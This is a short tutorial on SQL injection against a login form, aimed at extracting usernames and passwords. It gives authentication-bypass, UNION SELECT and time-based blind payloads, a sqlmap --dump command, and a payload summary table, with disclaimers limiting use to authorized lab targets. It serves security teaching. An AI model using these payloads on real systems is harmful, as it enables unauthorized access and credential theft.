# SQL Injection: Extracting Usernames & Passwords

This example demonstrates how an SQL Injection attack can be performed to extract usernames and passwords from a vulnerable web application's database. *Only perform this on authorized test environments.*

---

## Prerequisites

- A web application vulnerable to SQL Injection
- Tools like sqlmap or manual injection via web forms or URL parameters
- Basic knowledge of SQL syntax

---

## Manual SQL Injection Example

### Step 1: Identify Injection Point

Suppose there is a login form with inputs:
- Username
- Password

The backend query might be:

SELECT * FROM users WHERE username = '<input_username>' AND password = '<input_password>';

### Step 2: Inject Payload to Extract Data

Try injecting into the username field:

' OR '1'='1

and leave the password blank or anything. This modifies the query to:

SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';

Since '1'='1' always evaluates to TRUE, this bypasses login, but does not extract data.

### Step 3: Use UNION SELECT to Extract Data

If the application returns query results, try union-based SQL injection to retrieve usernames and passwords:

Input into username field:

' UNION SELECT username, password FROM users --

This appends the results of querying the usernames and passwords directly.

---

## Automated Extraction with SQLMap

Run in your terminal (replace http://targetsite.com/login with target URL):

sqlmap -u "http://targetsite.com/login" --data="username=admin&password=pass" --dump -p username

- --dump extracts database tables
- -p username tells sqlmap to test username parameter
- Use --dbs or --tables to enumerate databases and tables first

---

## Important Notes

- Always have explicit permission before testing any site.
- Use this only in test environments (DVWA, bWAPP, etc).
- SQL injection techniques vary by database type (MySQL, MSSQL, Oracle).

---

## Sample Payloads Summary

| Attack Type        | Payload Example                          | Purpose                          |
|--------------------|----------------------------------------|---------------------------------|
| Authentication bypass | `' OR '1'='1' -- `                   | Login bypass                    |
| Data extraction    | `' UNION SELECT username,password FROM users -- ` | Dump credentials from users table |
| Time-based blind   | `' WAITFOR DELAY '0:0:5' -- `           | Check blind injection presence  |

---

